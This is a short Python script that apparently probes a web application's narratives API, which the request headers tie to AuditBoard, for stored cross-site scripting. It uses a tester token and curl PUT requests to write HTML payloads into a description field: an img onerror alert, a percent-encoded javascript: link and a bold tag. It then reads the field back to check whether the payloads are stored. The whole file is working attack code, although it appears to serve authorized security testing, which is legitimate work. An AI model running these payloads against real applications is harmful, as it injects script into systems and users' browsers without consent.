import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TT=open('/tmp/bac_TESTER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TT),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXD'+uuid.uuid4().hex[:5]
print("=== narrative description: writable + rendered? ===")
pays=[
 ('img',   f'<img src=x onerror=alert(document.domain)>{tag}'),
 ('bold',  f'<b>{tag}</b>'),
 ('a-pct', f'<a href="javas%63ript:alert(document.domain)">{tag}</a>'),
]
for label,pay in pays:
    c,b=req('PUT','/api/v1/narratives/31',{"narrative":{"description":pay}})
    c2,b2=req('GET','/api/v1/narratives/31')
    st=''
    try: st=json.loads(b2)['narratives'][0].get('description')
    except: pass
    print(f"  {label:8} PUT={c} stored={str(st)[:90]!r}")
